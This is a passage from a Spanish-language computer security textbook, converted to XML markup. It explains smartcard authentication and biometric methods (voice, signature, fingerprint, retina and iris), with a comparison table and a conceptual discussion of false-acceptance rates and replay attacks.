Triple DES, funciones resumen&#x2026;); el criptoprocesador apoya estas tareas ofreciendo operaciones RSA con
claves de 512 a 1024 bits. Un ejemplo de implementaci&#x00F3;n real de este esquema lo constituye la tarjeta
inteligente CERES, de la F&#x00E1;brica Nacional de Moneda y Timbre espa~nola (<citation>[?]</citation>); en ella se incluye
adem&#x00E1;s un generador de n&#x00FA;meros aleatorios junto a los mecanismos de protecci&#x00F3;n internos de la
tarjeta.
<!--br/-->
<!--br/-->Cuando el usuario poseedor de una smartcard desea autenticarse necesita introducir la tarjeta en un
hardware lector; los dos dispositivos se identi&#xFB01;can entre s&#x02CA;&#x0131; con un protocolo a dos bandas en el que es
necesario que ambos conozcan la misma clave (CK o CCK, Company Key o Chipcard Communication
Key), lo que elimina la posibilidad de utilizar tarjetas de terceros para autenticarse ante el lector de una
determinada compa~n&#x02CA;&#x0131;a; adem&#x00E1;s esta clave puede utilizarse para asegurar la comunicaci&#x00F3;n entre la tarjeta y el
dispositivo lector. Tras identi&#xFB01;carse las dos partes, se lee la identi&#xFB01;caci&#x00F3;n personal (PID) de la tarjeta, y el
usuario teclea su PIN; se inicia entonces un protocolo desaf&#x02CA;&#x0131;o&#x2013;respuesta: se env&#x02CA;&#x0131;a el PID a la m&#x00E1;quina y &#x00E9;sta
desaf&#x02CA;&#x0131;a a la tarjeta, que responde al desaf&#x02CA;&#x0131;o utilizando una clave personal del usuario (PK, Personal Key).
Si la respuesta es correcta, el host ha identi&#xFB01;cado la tarjeta y el usuario obtiene acceso al recurso
pretendido.
<!--br/-->
<!--br/-->Las ventajas de utilizar tarjetas inteligentes como medio para autenticar usuarios son muchas frente a las
desventajas; se trata de un modelo ampliamente aceptado entre los usuarios, r&#x00E1;pido, y que incorpora
hardware de alta seguridad tanto para almacenar datos como para realizar funciones de cifrado. Adem&#x00E1;s, su
uso es factible tanto para controles de acceso f&#x02CA;&#x0131;sico como para controles de acceso l&#x00F3;gico a los hosts, y
se integra f&#x00E1;cilmente con otros mecanismos de autenticaci&#x00F3;n como las contrase~nas; y en caso
de desear bloquear el acceso de un usuario, no tenemos m&#x00E1;s que retener su tarjeta cuando
la introduzca en el lector o marcarla como inv&#x00E1;lida en una base de datos (por ejemplo, si se
equivoca varias veces al teclar su PIN, igual que sucede con una tarjeta de cr&#x00E9;dito normal). Como
principal inconveniente de las smartcards podemos citar el coste adicional que supone para una
organizaci&#x00F3;n el comprar y con&#xFB01;gurar la infraestructura de dispositivos lectores y las propias tarjetas;
aparte, que un usuario pierda su tarjeta es bastante f&#x00E1;cil, y durante el tiempo que no disponga
de ella o no puede acceder al sistema, o hemos de establecer reglas especiales que pueden
comprometer nuestra seguridad (y por supuesto se ha de marcar como tarjeta inv&#x00E1;lida en una base
de datos central, para que un potencial atacante no pueda utilizarla). Tambi&#x00E9;n la distancia
l&#x00F3;gica entre la smartcard y su poseedor &#x2013; simplemente nos podemos &#xFB01;jar en que la tarjeta no
tiene un interfaz para el usuario &#x2013; puede ser fuente de varios problemas de seguridad (<citation>[?]</citation>,
<citation>[?]</citation>).
<!--br/-->
<!--br/-->Aparte de los problemas que puede implicar el uso de smartcards en s&#x02CA;&#x0131;, contra la l&#x00F3;gica de una tarjeta
inteligente existen diversos m&#x00E9;todos de ataque, como realizar ingenier&#x02CA;&#x0131;a inversa &#x2013; destructiva &#x2013; contra el
circuito de silicio (y los contenidos de la ROM), adulterar la informaci&#x00F3;n guardada en la tarjeta o
determinar por diferentes m&#x00E9;todos el contenido de la memoria EEPROM. Sin duda una de las
personas que m&#x00E1;s ha contribuido a incrementar la seguridad de las smartcards gracias a sus
estudios y ataques es el experto brit&#x00E1;nico Ross J. Anderson (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;); en su p&#x00E1;gina web personal,
http://www.cl.cam.ac.uk/users/rja14/, podemos encontrar todos sus art&#x02CA;&#x0131;culos sobre este
tema <anchor 
   id="x1-112002f1"  ></anchor><footnote><para>     Y sobre otros, principalmente esteganograf&#x02CA;&#x0131;a y criptograf&#x02CA;&#x0131;a.</para></footnote>,
demasiados como para citarlos aqu&#x02CA;&#x0131; uno a uno.
  </section><!--end section--><!--l. 199--><section 
role="section"><title><abbrev role="title-mark">8.4</abbrev><anchor 
   id="x1-1130008.4"  ></anchor>Sistemas de autenticaci&#x00F3;n biom&#x00E9;trica</title>
<!--l. 200--><para>  A pesar de la importancia de la criptolog&#x02CA;&#x0131;a en cualquiera de los sistemas de identi&#xFB01;caci&#x00F3;n de usuarios
vistos, existen otra clase de sistemas en los que no se aplica esta ciencia, o al menos su aplicaci&#x00F3;n es
secundaria. Es m&#x00E1;s, parece que en un futuro no muy lejano estos ser&#x00E1;n los sistemas que se van a imponer en

la mayor&#x02CA;&#x0131;a de situaciones en las que se haga necesario autenticar un usuario: son m&#x00E1;s amigables para el
usuario (no va a necesitar recordar passwords o n&#x00FA;meros de identi&#xFB01;caci&#x00F3;n complejos, y, como se suele
decir, el usuario puede olvidar una tarjeta de identi&#xFB01;caci&#x00F3;n en casa, pero nunca se olvidar&#x00E1; de su
mano o su ojo) y son mucho m&#x00E1;s dif&#x02CA;&#x0131;ciles de falsi&#xFB01;car que una simple contrase~na o una tarjeta
magn&#x00E9;tica; las principales razones por la que no se han impuesto ya en nuestros dias es su
elevado precio, fuera del alcance de muchas organizaciones, y su di&#xFB01;cultad de mantenimiento
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Estos sistemas son los denominados biom&#x00E9;tricos, basados en caracter&#x02CA;&#x0131;sticas f&#x02CA;&#x0131;sicas del usuario a identi&#xFB01;car.
El reconocimiento de formas, la inteligencia arti&#xFB01;cial y el aprendizaje son las ramas de la inform&#x00E1;tica que
desempe~nan el papel m&#x00E1;s importante en los sistemas de identi&#xFB01;caci&#x00F3;n biom&#x00E9;tricos; la criptolog&#x02CA;&#x0131;a se limita
aqu&#x02CA;&#x0131; a un uso secundario, como el cifrado de una base de datos de patrones retinales, o la transmisi&#x00F3;n de
una huella dactilar entre un dispositivo analizador y una base de datos. La autenticaci&#x00F3;n basada en
caracter&#x02CA;&#x0131;sticas f&#x02CA;&#x0131;sicas existe desde que existe el hombre y, sin darnos cuenta, es la que m&#x00E1;s utiliza
cualquiera de nosotros en su vida cotidiana: a diario identi&#xFB01;camos a personas por los rasgos de su
cara o por su voz. Obviamente aqu&#x02CA;&#x0131; el agente reconocedor lo tiene f&#x00E1;cil porque es una persona,
pero en el modelo aplicable a redes o sistemas Unix el agente ha de ser un dispositivo que,
bas&#x00E1;ndose en caracter&#x02CA;&#x0131;sticas del sujeto a identi&#xFB01;car, le permita o deniegue acceso a un determinado
recurso.
<!--br/-->


</para><section role="center"><title/>
<!--l. 231--><para> </para><table ><informaltable><tgroup cols="7"><tbody><row><entry 
 align="char"><para>                </para></entry><entry 
 align="char"><para>Ojo &#x2013; Iris  </para></entry><entry 
 align="char"><para>Ojo          &#x2013;
Retina     </para></entry><entry 
 align="char"><para>Huellas
dactilares  </para></entry><entry 
 align="char"><para>Geometr&#x02CA;&#x0131;a  de
la mano     </para></entry><entry 
 align="char"><para>Escritura
&#x2013; Firma  </para></entry><entry 
 align="char"><para>Voz         </para></entry>
 </row><row><entry 
 align="char"><para>Fiabilidad   </para></entry><entry 
 align="char"><para>Muy alta   </para></entry><entry 
 align="char"><para>Muy alta   </para></entry><entry 
 align="char"><para>Alta      </para></entry><entry 
 align="char"><para>Alta        </para></entry><entry 
 align="char"><para>Alta     </para></entry><entry 
 align="char"><para>Alta        </para></entry>
 </row><row><entry 
 align="char"><para>Facilidad de
uso            </para></entry><entry 
 align="char"><para>Media     </para></entry><entry 
 align="char"><para>Baja      </para></entry><entry 
 align="char"><para>Alta      </para></entry><entry 
 align="char"><para>Alta        </para></entry><entry 
 align="char"><para>Alta     </para></entry><entry 
 align="char"><para>Alta        </para></entry>
 </row><row><entry 
 align="char"><para>Prevenci&#x00F3;n
de ataques  </para></entry><entry 
 align="char"><para>Muy Alta  </para></entry><entry 
 align="char"><para>Muy alta   </para></entry><entry 
 align="char"><para>Alta      </para></entry><entry 
 align="char"><para>Alta        </para></entry><entry 
 align="char"><para>Media    </para></entry><entry 
 align="char"><para>Media       </para></entry>
 </row><row><entry 
 align="char"><para>Aceptaci&#x00F3;n   </para></entry><entry 
 align="char"><para>Media     </para></entry><entry 
 align="char"><para>Media     </para></entry><entry 
 align="char"><para>Media     </para></entry><entry 
 align="char"><para>Alta        </para></entry><entry 
 align="char"><para>Muy alta </para></entry><entry 
 align="char"><para>Alta        </para></entry>
 </row><row><entry 
 align="char"><para>Estabilidad </para></entry><entry 
 align="char"><para>Alta       </para></entry><entry 
 align="char"><para>Alta       </para></entry><entry 
 align="char"><para>Alta      </para></entry><entry 
 align="char"><para>Media       </para></entry><entry 
 align="char"><para>Media    </para></entry><entry 
 align="char"><para>Media       </para></entry>
 </row><row><entry 
 align="char"><para>Identi&#xFB01;caci&#x00F3;n
y
autenticaci&#x00F3;n</para></entry><entry 
 align="char"><para>Ambas     </para></entry><entry 
 align="char"><para>Ambas     </para></entry><entry 
 align="char"><para>Ambas    </para></entry><entry 
 align="char"><para>Autenticaci&#x00F3;n </para></entry><entry 
 align="char"><para>Ambas   </para></entry><entry 
 align="char"><para>Autenticaci&#x00F3;n </para></entry>
 </row><row><entry 
 align="char"><para>Est&#x00E1;ndars     </para></entry><entry 
 align="char"><para>&#x2013;         </para></entry><entry 
 align="char"><para>&#x2013;         </para></entry><entry 
 align="char"><para>ANSI/NIST,
FBI      </para></entry><entry 
 align="char"><para>&#x2013;           </para></entry><entry 
 align="char"><para>&#x2013;        </para></entry><entry 
 align="char"><para>SVAPI      </para></entry>
 </row><row><entry 
 align="char"><para>Interferencias </para></entry><entry 
 align="char"><para>Gafas      </para></entry><entry 
 align="char"><para>Irritaciones </para></entry><entry 
 align="char"><para>Suciedad,
heridas,
asperezas &#x2026;</para></entry><entry 
 align="char"><para>Artritis,
reumatismo &#x2026;</para></entry><entry 
 align="char"><para>Firmas
f&#x00E1;ciles      o
cambiantes</para></entry><entry 
 align="char"><para>Ruido,
resfriados &#x2026;  </para></entry>
 </row><row><entry 
 align="char"><para>Utilizaci&#x00F3;n    </para></entry><entry 
 align="char"><para>Instalaciones
nucleares,
servicios
m&#x00E9;dicos,
centros
penitenciarios</para></entry><entry 
 align="char"><para>Instalaciones
nucleares,
servicios
m&#x00E9;dicos,
centros
penitenciarios</para></entry><entry 
 align="char"><para>Polic&#x02CA;&#x0131;a,
industrial  </para></entry><entry 
 align="char"><para>General     </para></entry><entry 
 align="char"><para>Industrial </para></entry><entry 
 align="char"><para>Accesos
remotos
en   bancos   o
bases de datos</para></entry>
 </row><row><entry 
 align="char"><para>Precio
por nodo en
1997 (USD) </para></entry><entry 
 align="char"><para>5000       </para></entry><entry 
 align="char"><para>5000       </para></entry><entry 
 align="char"><para>1200      </para></entry><entry 
 align="char"><para>2100        </para></entry><entry 
 align="char"><para>1000     </para></entry><entry 
 align="char"><para>1200        </para></entry>
 </row><row><entry 
 align="char"><para>                </para></entry>
 </row></tbody></tgroup></informaltable></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1130011"  ></anchor>Cuadro&#x00A0;8.1</title><para>Comparaci&#x00F3;n de m&#x00E9;todos biom&#x00E9;tricos.</para></blockquote>

<!--l. 261--><para>  Aunque la autenticaci&#x00F3;n de usuarios mediante m&#x00E9;todos biom&#x00E9;tricos es posible utilizando cualquier
caracter&#x02CA;&#x0131;stica &#x00FA;nica y mesurable del individuo (esto incluye desde la forma de teclear ante un ordenador
hasta los patrones de ciertas venas, pasando por el olor corporal), tradicionalmente ha estado basada en
cinco grandes grupos (<citation>[?]</citation>). En la tabla  <ulink 
  url="#x1-1130011"  ><!--ref: biocomp--></ulink> (<citation>[?]</citation>, <citation>[?]</citation>) se muestra una comparativa de sus rasgos m&#x00E1;s generales,
que vamos a ver con m&#x00E1;s detalle en los puntos siguientes.
<!--br/-->
<!--br/-->Los dispositivos biom&#x00E9;tricos tienen tres partes principales; por un lado, disponen de un mecanismo
autom&#x00E1;tico que lee y captura una imagen digital o anal&#x00F3;gica de la caracter&#x02CA;&#x0131;stica a analizar. Adem&#x00E1;s disponen
de una entidad para manejar aspectos como la compresi&#x00F3;n, almacenamiento o comparaci&#x00F3;n de los datos
capturados con los guardados en una base de datos (que son considerados v&#x00E1;lidos), y tambi&#x00E9;n ofrecen
una interfaz para las aplicaciones que los utilizan. El proceso general de autenticaci&#x00F3;n sigue
unos pasos comunes a todos los modelos de autenticaci&#x00F3;n biom&#x00E9;trica: captura o lectura de los
datos que el usuario a validar presenta, extracci&#x00F3;n de ciertas caracter&#x02CA;&#x0131;sticas de la muestra (por
ejemplo, las minucias de una huella dactilar), comparaci&#x00F3;n de tales caracter&#x02CA;&#x0131;sticas con las
guardadas en una base de datos, y decisi&#x00F3;n de si el usuario es v&#x00E1;lido o no. Es en esta decisi&#x00F3;n donde
principalmente entran en juego las dos caracter&#x02CA;&#x0131;sticas b&#x00E1;sicas de la &#xFB01;abilidad de todo sistema biom&#x00E9;trico
(en general, de todo sistema de autenticaci&#x00F3;n): las tasas de falso rechazo y de falsa aceptaci&#x00F3;n.
Por tasa de falso rechazo (False Rejection Rate, FRR) se entiende la probabilidad de que
el sistema de autenticaci&#x00F3;n rechaze a un usuario leg&#x02CA;&#x0131;timo porque no es capaz de identi&#xFB01;carlo
correctamente, y por tasa de falsa aceptaci&#x00F3;n (False Acceptance Rate, FAR) la probabilidad de que el
sistema autentique correctamente a un usuario ileg&#x02CA;&#x0131;timo; evidentemente, una FRR alta provoca
descontento entre los usuarios del sistema, pero una FAR elevada genera un grave problema de
seguridad: estamos proporcionando acceso a un recurso a personal no autorizado a acceder a
&#x00E9;l.
<!--br/-->
<!--br/-->Por &#x00FA;ltimo, y antes de entrar m&#x00E1;s a fondo con los esquemas de autenticaci&#x00F3;n biom&#x00E9;trica cl&#x00E1;sicos, quiz&#x00E1;s es
conveniente desmentir uno de los grandes mitos de estos modelos: la vulnerabilidad a ataques de simulaci&#x00F3;n.
En cualquier pel&#x02CA;&#x0131;cula o libro de esp&#x02CA;&#x0131;as que se precie, siempre se consigue &#x2018;enga~nar&#x2019; a autenticadores
biom&#x00E9;tricos para conseguir acceso a determinadas instalaciones mediante estos ataques: se simula la
parte del cuerpo a analizar mediante un modelo o incluso utilizando &#x00F3;rganos amputados a un
cad&#x00E1;ver o al propio usuario vivo (crudamente, se le corta una mano o un dedo, se le saca un
ojo&#x2026;para conseguir que el sistema permita la entrada). Evidentemente, esto s&#x00F3;lo sucede en
la &#xFB01;cci&#x00F3;n: hoy en d&#x02CA;&#x0131;a cualquier sistema biom&#x00E9;trico &#x2013; con excepci&#x00F3;n, quiz&#x00E1;s, de algunos modelos
basados en voz de los que hablaremos luego &#x2013; son altamente inmunes a estos ataques. Los
analizadores de retina, de iris, de huellas o de la geometr&#x02CA;&#x0131;a de la mano son capaces, aparte de decidir
si el miembro pertenece al usuario leg&#x02CA;&#x0131;timo, de determinar si &#x00E9;ste est&#x00E1; vivo o se trata de un
cad&#x00E1;ver.
  </para><!--l. 309--><section 
role="subsection"><title><abbrev role="title-mark">8.4.1</abbrev><anchor 
   id="x1-1140008.4.1"  ></anchor>Veri&#xFB01;caci&#x00F3;n de voz</title>
<!--l. 310--><para>  En los sistemas de reconocimiento de voz no se intenta, como mucha gente piensa, reconocer lo que
el usuario dice, sino identi&#xFB01;car una serie de sonidos y sus caracter&#x02CA;&#x0131;sticas para decidir si el
usuario es quien dice ser. Para autenticar a un usuario utilizando un reconocedor de voz se debe
disponer de ciertas condiciones para el correcto registro de los datos, como ausencia de ruidos,
reverberaciones o ecos; idealmente, estas condiciones han de ser las mismas siempre que se necesite la
autenticaci&#x00F3;n.
<!--br/-->
<!--br/-->Cuando un usuario desea acceder al sistema pronunciar&#x00E1; unas frases en las cuales reside gran parte de la
seguridad del protocolo; en algunos modelos, los denominados de texto dependiente, el sistema tiene
almacenadas un conjunto muy limitado de frases que es capaz de reconocer: por ejemplo, imaginemos que
el usuario se limita a pronunciar su nombre, de forma que el reconocedor lo entienda y lo autentique.
Como veremos a continuaci&#x00F3;n, estos modelos proporcionan poca seguridad en comparaci&#x00F3;n con los de texto
independiente, donde el sistema va &#x2018;proponiendo&#x2019; a la persona la pronunciaci&#x00F3;n de ciertas palabras
extra&#x02CA;&#x0131;das de un conjunto bastante grande. De cualquier forma, sea cual sea el modelo, lo habitual
es que las frases o palabras sean caracter&#x02CA;&#x0131;sticas para maximizar la cantidad de datos que se
pueden analizar (por ejemplo, frases con una cierta entonaci&#x00F3;n, pronunciaci&#x00F3;n de los diptongos,

palabras con muchas vocales&#x2026;). Conforme va hablando el usuario, el sistema registra toda la
informaci&#x00F3;n que le es &#x00FA;til; cuando termina la frase, ya ha de estar en disposici&#x00F3;n de facilitar o
denegar el acceso, en funci&#x00F3;n de la informaci&#x00F3;n analizada y contrastada con la de la base de
datos.
<!--br/-->
<!--br/-->El principal problema del reconocimiento de voz es la inmunidad frente a replay attacks, un modelo de
ataques de simulaci&#x00F3;n en los que un atacante reproduce (por ejemplo, por medio de un magnet&#x00F3;fono) las
frases o palabras que el usuario leg&#x02CA;&#x0131;timo pronuncia para acceder al sistema. Este problema es
especialmente grave en los sistemas que se basan en textos preestablecidos: volviendo al ejemplo anterior,
el del nombre de cada usuario, un atacante no tendr&#x02CA;&#x0131;a m&#x00E1;s que grabar a una persona que pronuncia su
nombre ante el autenticador y luego reproducir ese sonido para conseguir el acceso; casi la &#x00FA;nica soluci&#x00F3;n
consiste en utilizar otro sistema de autenticaci&#x00F3;n junto al reconocimiento de voz. Por contra, en modelos de
texto independiente, m&#x00E1;s interactivos, este ataque no es tan sencillo porque la autenticaci&#x00F3;n se produce
realmente por una especie de desaf&#x02CA;&#x0131;o&#x2013;respuesta entre el usuario y la m&#x00E1;quina, de forma que la
cantidad de texto grabado habr&#x02CA;&#x0131;a de ser mucho mayor &#x2013; y la velocidad para localizar la parte del
texto que el sistema propone habr&#x02CA;&#x0131;a de ser elevada &#x2013;. Otro grave problema de los sistemas
basados en reconocimiento de voz es el tiempo que el usuario emplea hablando delante del
analizador, al que se a~nade el que &#x00E9;ste necesita para extraer la informaci&#x00F3;n y contrastarla con la de su
base de datos; aunque actualmente en la mayor&#x02CA;&#x0131;a de sistemas basta con una sola frase, es
habitual que el usuario se vea obligado a repetirla porque el sistema le deniega el acceso (una
simple congesti&#x00F3;n hace variar el tono de voz, aunque sea levemente, y el sistema no es capaz
de decidir si el acceso ha de ser autorizado o no; incluso el estado an&#x02CA;&#x0131;mico de una persona
var&#x02CA;&#x0131;a su timbre&#x2026;). A su favor, el reconocimiento de voz posee la cualidad de una excelente
acogida entre los usuarios, siempre y cuando su funcionamiento sea correcto y &#x00E9;stos no se vean
obligados a repetir lo mismo varias veces, o se les niegue un acceso porque no se les reconoce
correctamente.
  </para></section><!--end subsection--><!--l. 362--><section 
role="subsection"><title><abbrev role="title-mark">8.4.2</abbrev><anchor 
   id="x1-1150008.4.2"  ></anchor>Veri&#xFB01;caci&#x00F3;n de escritura</title>
<!--l. 363--><para>  Aunque la escritura (generalmente la &#xFB01;rma) no es una caracter&#x02CA;&#x0131;stica estrictamente biom&#x00E9;trica, como
hemos comentado en la introducci&#x00F3;n se suele agrupar dentro de esta categor&#x02CA;&#x0131;a; de la misma forma que
suced&#x02CA;&#x0131;a en la veri&#xFB01;caci&#x00F3;n de la voz, el objetivo aqu&#x02CA;&#x0131; no es interpretar o entender lo que el usuario
escribe en el lector, sino autenticarlo bas&#x00E1;ndose en ciertos rasgos tanto de la &#xFB01;rma como de su
r&#x00FA;brica.
<!--br/-->
<!--br/-->La veri&#xFB01;caci&#x00F3;n en base a &#xFB01;rmas es algo que todos utilizamos y aceptamos d&#x02CA;&#x0131;a a d&#x02CA;&#x0131;a en documentos o
cheques; no obstante, existe una diferencia fundamental entre el uso de las &#xFB01;rmas que hacemos en
nuestra vida cotidiana y los sistemas biom&#x00E9;tricos; mientras que habitualmente la veri&#xFB01;caci&#x00F3;n de la
&#xFB01;rma consiste en un simple an&#x00E1;lisis visual sobre una impresi&#x00F3;n en papel, est&#x00E1;tica, en los sistemas
autom&#x00E1;ticos no es posible autenticar usuarios en base a la representaci&#x00F3;n de los trazos de su &#xFB01;rma.
En los modelos biom&#x00E9;tricos se utiliza adem&#x00E1;s la forma de &#xFB01;rmar, las caracter&#x02CA;&#x0131;sticas din&#x00E1;micas
(por eso se les suele denominar Dynamic Signature Veri&#xFB01;cation, DSV): el tiempo utilizado
para rubricar, las veces que se separa el bol&#x02CA;&#x0131;grafo del papel, el &#x00E1;ngulo con que se realiza cada
trazo&#x2026;
<!--br/-->
<!--br/-->Para utilizar un sistema de autenticaci&#x00F3;n basado en &#xFB01;rmas se solicita en primer lugar a los futuros usuarios
un n&#x00FA;mero determinado de &#xFB01;rmas ejemplo, de las cuales el sistema extrae y almacena ciertas caracter&#x02CA;&#x0131;sticas;
esta etapa se denomina de aprendizaje, y el principal obst&#x00E1;culo a su correcta ejecuci&#x00F3;n son los usuarios que
no suelen &#xFB01;rmar uniformemente. Contra este problema la &#x00FA;nica soluci&#x00F3;n (aparte de una concienciaci&#x00F3;n de
tales usuarios) es relajar las restricciones del sistema a la hora de aprender &#xFB01;rmas, con lo que se
decrementa su seguridad.
<!--br/-->
<!--br/-->Una vez que el sistema conoce las &#xFB01;rmas de sus usuarios, cuando estos desean acceder a &#x00E9;l se les solicita tal
&#xFB01;rma, con un n&#x00FA;mero limitado de intentos (generalmente m&#x00E1;s que los sistemas que autentican mediante
contrase~nas, ya que la &#xFB01;rma puede variar en un individuo por m&#x00FA;ltiples factores). La &#xFB01;rma introducida es
capturada por un l&#x00E1;piz &#x00F3;ptico o por una lectora sensible (o por ambos), y el acceso al sistema se produce una

vez que el usuario ha introducido una &#xFB01;rma que el veri&#xFB01;cador es capaz de distinguir como
aut&#x00E9;ntica.
  </para></section><!--end subsection--><!--l. 397--><section 
role="subsection"><title><abbrev role="title-mark">8.4.3</abbrev><anchor 
   id="x1-1160008.4.3"  ></anchor>Veri&#xFB01;caci&#x00F3;n de huellas</title>
<!--l. 398--><para>  T&#x02CA;&#x0131;picamente la huella dactilar de un individuo ha sido un patr&#x00F3;n bastante bueno para determinar su
identidad de forma inequ&#x02CA;&#x0131;voca, ya que est&#x00E1; aceptado que dos dedos nunca poseen huellas similares, ni
siquiera entre gemelos o entre dedos de la misma persona. Por tanto, parece obvio que las huellas se
convertir&#x02CA;&#x0131;an antes o despu&#x00E9;s en un modelo de autenticaci&#x00F3;n biom&#x00E9;trico: desde el siglo pasado hasta nuestros
d&#x02CA;&#x0131;as se vienen realizando con &#x00E9;xito clasi&#xFB01;caciones sistem&#x00E1;ticas de huellas dactilares en entornos policiales, y
el uso de estos patrones fu&#x00E9; uno de los primeros en establecerse como modelo de autenticaci&#x00F3;n
biom&#x00E9;trica.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 409--><para> heightwidthdepth&#xFB01;ngerprint.png<graphic width="64.77777pt" fileref="fingerprint.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1160012"  ></anchor>Figura&#x00A0;8.2</title><para>Huella dactilar con sus minucias extra&#x02CA;&#x0131;das. &#x00A9;1998 Idex AS, http://www.idex.no/.</para></blockquote>

  </blockquote></figure>
<!--br/-->Cuando un usuario desea autenticarse ante el sistema situa su dedo en un &#x00E1;rea determinada
(&#x00E1;rea de lectura, no se necesita en ning&#x00FA;n momento una impresi&#x00F3;n en tinta). Aqu&#x02CA;&#x0131; se
toma una imagen que posteriormente se normaliza mediante un sistema de &#xFB01;nos
espejos <anchor 
   id="x1-116002f2"  ></anchor><footnote><para>     Existen otros m&#x00E9;todos para obtener una imagen de la huella, como la representaci&#x00F3;n t&#x00E9;rmica, pero su uso es menos habitual
&#x2013; principalmente por el precio de los lectores &#x2013;.</para></footnote>
para corregir &#x00E1;ngulos, y es de esta imagen normalizada de la que el sistema extrae las minucias (ciertos
arcos, bucles o remolinos de la huella) que va a comparar contra las que tiene en su base de datos; es
importante resaltar que lo que el sistema es capaz de analizar no es la huella en s&#x02CA;&#x0131; sino que son estas
minucias, concretamente la posici&#x00F3;n relativa de cada una de ellas. Est&#x00E1; demostrado que dos dedos
nunca pueden poseer m&#x00E1;s de ocho minucias comunes, y cada uno tiene al menos 30 o 40 de
&#x00E9;stas (en la &#xFB01;gura  <ulink 
  url="#x1-1160012"  ><!--ref: fingerprint--></ulink> podemos ver una imagen de una huella digitalizada con sus minucias). Si
la comparaci&#x00F3;n de las posiciones relativas de las minucias le&#x02CA;&#x0131;das con las almacenadas en la
base de datos es correcta, se permite el acceso al usuario, deneg&#x00E1;ndosele obviamente en caso
contrario.
<!--br/-->
<!--br/-->Los sistemas basados en reconocimiento de huellas son relativamente baratos (en comparaci&#x00F3;n con
otros biom&#x00E9;tricos, como los basados en patrones retinales); sin embargo, tienen en su contra la
incapacidad temporal de autenticar usuarios que se hayan podido herir en el dedo a reconocer (un
peque~no corte o una quemadura que afecte a varias minucias pueden hacer in&#x00FA;til al sistema).
Tambi&#x00E9;n elementos como la suciedad del dedo, la presi&#x00F3;n ejercida sobre el lector o el estado de
la piel pueden ocasionar lecturas err&#x00F3;neas. Otro factor a tener muy en cuenta contra estos
sistemas es psicol&#x00F3;gico, no t&#x00E9;cnico: hemos dicho en la introducci&#x00F3;n que un sistema de autenticaci&#x00F3;n de
usuarios ha de ser aceptable por los mismos, y generalmente el reconocimiento de huellas
se asocia a los criminales, por lo que muchos usuarios recelan del reconocedor y de su uso
(<citation>[?]</citation>).
  </section><!--end subsection--><!--l. 446--><section 
role="subsection"><title><abbrev role="title-mark">8.4.4</abbrev><anchor 
   id="x1-1170008.4.4"  ></anchor>Veri&#xFB01;caci&#x00F3;n de patrones oculares</title>
<!--l. 447--><para>  Los modelos de autenticaci&#x00F3;n biom&#x00E9;trica basados en patrones oculares se dividen en dos tecnolog&#x02CA;&#x0131;as
diferentes: o bien analizan patrones retinales, o bien analizan el iris. Estos m&#x00E9;todos se suelen considerar los
m&#x00E1;s efectivos: para una poblaci&#x00F3;n de 200 millones de potenciales usuarios la probabilidad de
coincidencia es casi 0, y adem&#x00E1;s una vez muerto el individuo los tejidos oculares degeneran
r&#x00E1;pidamente, lo que di&#xFB01;culta la falsa aceptaci&#x00F3;n de atacantes que puedan robar este &#x00F3;rgano de un
cad&#x00E1;ver.
<!--br/-->
<!--br/-->La principal desventaja de los m&#x00E9;todos basados en el an&#x00E1;lisis de patrones oculares es su escasa aceptaci&#x00F3;n; el
hecho de mirar a trav&#x00E9;s de un binocular (o monocular), necesario en ambos modelos, no es c&#x00F3;modo para los
usuarios, ni aceptable para muchos de ellos: por un lado, los usuarios no se f&#x02CA;&#x0131;an de un haz de rayos analizando
su ojo <anchor 
   id="x1-117001f3"  ></anchor><footnote><para>     Aunque en el caso de los irises existen dispositivos capaces de leer a una distancia de varios metros, haciendo el proceso
menos agresivo.</para></footnote>,
y por otro un examen de este &#x00F3;rgano puede revelar enfermedades o caracter&#x02CA;&#x0131;sticas m&#x00E9;dicas que a muchas
personas les puede interesar mantener en secreto, como el consumo de alcohol o de ciertas drogas. Aunque
los fabricantes de dispositivos lectores aseguran que s&#x00F3;lo se analiza el ojo para obtener patrones
relacionados con la autenticaci&#x00F3;n, y en ning&#x00FA;n caso se viola la privacidad de los usuarios, mucha
gente no cree esta postura o&#xFB01;cial (aparte del hecho de que la informaci&#x00F3;n es procesada v&#x02CA;&#x0131;a
software, lo que facilita introducir modi&#xFB01;caciones sobre lo que nos han vendido para que un
lector realice otras tareas de forma enmascarada). Por si esto fuera poco, se trata de sistemas
demasiado caros para la mayor&#x02CA;&#x0131;a de organizaciones, y el proceso de autenticaci&#x00F3;n no es todo lo r&#x00E1;pido
que debiera en poblaciones de usuarios elevadas. De esta forma, su uso se ve reducido casi
s&#x00F3;lo a la identi&#xFB01;caci&#x00F3;n en sistemas de alta seguridad, como el control de acceso a instalaciones
militares.
  </para><!--l. 477--><section 
role="subsubsection"><title><anchor 
   id="x1-1180008.4.4"  ></anchor>Retina</title>
<!--l. 478--><para>  La vasculatura retinal (forma de los vasos sangu&#x02CA;&#x0131;neos de la retina humana) es un elemento caracter&#x02CA;&#x0131;stico
de cada individuo, por lo que numerosos estudios en el campo de la autenticaci&#x00F3;n de usuarios se basan en el

reconocimiento de esta vasculatura.
<!--br/-->
<!--br/-->En los sistemas de autenticaci&#x00F3;n basados en patrones retinales el usuario a identi&#xFB01;car ha de mirar a trav&#x00E9;s de
unos binoculares, ajustar la distancia interocular y el movimiento de la cabeza, mirar a un punto
determinado y por &#x00FA;ltimo pulsar un bot&#x00F3;n para indicar al dispositivo que se encuentra listo para el an&#x00E1;lisis.
En ese momento se escanea la retina con una radiaci&#x00F3;n infrarroja de baja intensidad en forma de espiral,
detectando los nodos y ramas del &#x00E1;rea retinal para compararlos con los almacenados en una base de datos;
si la muestra coincide con la almacenada para el usuario que el individuo dice ser, se permite el
acceso.
<!--br/-->
<!--br/-->La compa~n&#x02CA;&#x0131;a EyeDentify posee la patente mundial para analizadores de vasculatura retinal, por
lo que es la principal desarrolladora de esta tecnolog&#x02CA;&#x0131;a; su p&#x00E1;gina web se puede encontrar en
http://www.eyedentify.com/.
  </para></section><!--end subsubsection--><!--l. 495--><section 
role="subsubsection"><title><anchor 
   id="x1-1190008.4.4"  ></anchor>Iris</title>
<!--l. 496--><para>  El iris humano (el anillo que rodea la pupila, que a simple vista diferencia el color de ojos de cada
persona) es igual que la vasculatura retinal una estructura &#x00FA;nica por individuo que forma un sistema muy
